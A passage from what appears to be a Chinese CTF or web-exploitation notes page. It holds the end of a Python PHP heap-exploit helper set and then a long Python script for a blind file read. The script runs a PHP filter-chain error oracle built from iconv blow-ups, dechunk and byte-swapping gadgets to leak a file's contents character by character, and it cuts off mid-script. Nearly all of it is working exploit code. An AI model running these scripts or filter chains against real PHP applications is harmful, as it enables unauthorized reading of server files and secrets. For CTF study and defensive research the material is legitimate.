class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure><h2 id="无回显任意文件读能泄露文件内容"><a href="#无回显任意文件读能泄露文件内容" class="headerlink" title="无回显任意文件读能泄露文件内容"></a>无回显任意文件读能泄露文件内容</h2><p><a href="https://tttang.com/archive/1755/">文章</a></p><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>只有读取没有返回</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>session = requests.Session()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">THE GRAND IDEA:</span><br><span class="hljs-string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span><br><span class="hljs-string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span><br><span class="hljs-string">the string is empty.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE GRAND IDEA 2:</span><br><span class="hljs-string">The dechunk filter is interesting.</span><br><span class="hljs-string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span><br><span class="hljs-string">It looks like it was implemented for something http related, but for our purposes, the interesting</span><br><span class="hljs-string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span><br><span class="hljs-string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span><br><span class="hljs-string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span><br><span class="hljs-string"></span><br><span class="hljs-string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string"></span><br><span class="hljs-string">does not cause a 500 error.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE REST:</span><br><span class="hljs-string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span><br><span class="hljs-string">into madness trying to figure out ways to:</span><br><span class="hljs-string">- somehow get other characters not at the start of the flag file to the front</span><br><span class="hljs-string">- detect more precisely which character is at the front</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">join</span>(<span class="hljs-params">*x</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;|&#x27;</span>.join(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">err</span>(<span class="hljs-params">s</span>):<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">raise</span> ValueError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req</span>(<span class="hljs-params">s</span>):<br>    data = &#123;<br><span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">f&#x27;php://filter/<span class="hljs-subst">&#123;s&#125;</span>/resource=/flag&#x27;</span><br>&#125;<br>    proxies = &#123;<br>        <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://host_ip:8080&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">global</span> session<br>    response = session.post(<span class="hljs-string">&#x27;http://wsl_ip:8080/&#x27;</span>, data=data, proxies=proxies)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Fatal error&quot;</span> <span class="hljs-keyword">in</span> response.text)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 1:</span><br><span class="hljs-string">The second step of our exploit only works under two conditions:</span><br><span class="hljs-string">- String only contains a-zA-Z0-9</span><br><span class="hljs-string">- String ends with two equals signs</span><br><span class="hljs-string"></span><br><span class="hljs-string">base64-encoding the flag file twice takes care of the first condition.</span><br><span class="hljs-string"></span><br><span class="hljs-string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span><br><span class="hljs-string">signs.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Repeated application of the convert.quoted-printable-encode will only consume additional</span><br><span class="hljs-string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span><br><span class="hljs-string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span><br><span class="hljs-string">flag with convert.iconv..CSISO2022KR until it does.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>blow_up_enc = join(*[<span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="hljs-number">1000</span>)<br>blow_up_utf32 = <span class="hljs-string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span><br>blow_up_inf = join(*[blow_up_utf32]*<span class="hljs-number">50</span>)<br><br>header = <span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><br><span class="hljs-comment"># Start get baseline blowup</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calculating blowup&#x27;</span>)<br>baseline_blowup = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>payload = join(*[blow_up_utf32]*n)<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>):<br>baseline_blowup = n<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;baseline blowup is <span class="hljs-subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)<br><br>trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">assert</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)<br>j = [<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>)<br>]<br><span class="hljs-built_in">print</span>(j)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != <span class="hljs-number">2</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">1</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">2</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;j: <span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;header: <span class="hljs-subst">&#123;header&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step two:</span><br><span class="hljs-string">Now we have something of the form</span><br><span class="hljs-string">[a-zA-Z0-9 things]==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span><br><span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span><br><span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span><br><span class="hljs-string">there are filters that *swap* characters:</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span><br><span class="hljs-string">abcdefgh -&gt; badcfehg</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span><br><span class="hljs-string">abcdefgh -&gt; dcbahgfe</span><br><span class="hljs-string"></span><br><span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span><br><span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span><br><span class="hljs-string">the string:</span><br><span class="hljs-string"></span><br><span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span><br><span class="hljs-string"></span><br><span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span><br><span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span><br><span class="hljs-string">bafedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span><br><span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span><br><span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span><br><span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span><br><span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span><br><span class="hljs-string">turns out, if we apply the filter</span><br><span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span><br><span class="hljs-string"></span><br><span class="hljs-string">It will turn the == into:</span><br><span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">And this is magic, because this corrects such that when we apply the</span><br><span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;s recap. We have a string like:</span><br><span class="hljs-string">abcdefghij==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span><br><span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span><br><span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply r4 gadget:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span><br><span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then apply r4 once more:</span><br><span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span><br><span class="hljs-string"></span><br><span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span><br><span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span><br><span class="hljs-string">want, to access all the characters in the string ;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>flip = <span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span><br>r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span><br>r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_nth</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">global</span> flip, r2, r4<br>o = []<br>chunk = n // <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>: o.append(r4)<br>o.extend([flip, r4] * (chunk // <span class="hljs-number">2</span>))<br><span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ^ (chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): o.append(r2)<br><span class="hljs-keyword">return</span> join(*o)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 3:</span><br><span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span><br><span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span><br><span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span><br><span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span><br><span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span><br><span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span><br><span class="hljs-string">string to figure out which number it is.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span><br>be = <span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span><br>o = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_letter</span>(<span class="hljs-params">prefix</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<br><span class="hljs-comment"># a-f A-F 0-9</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span 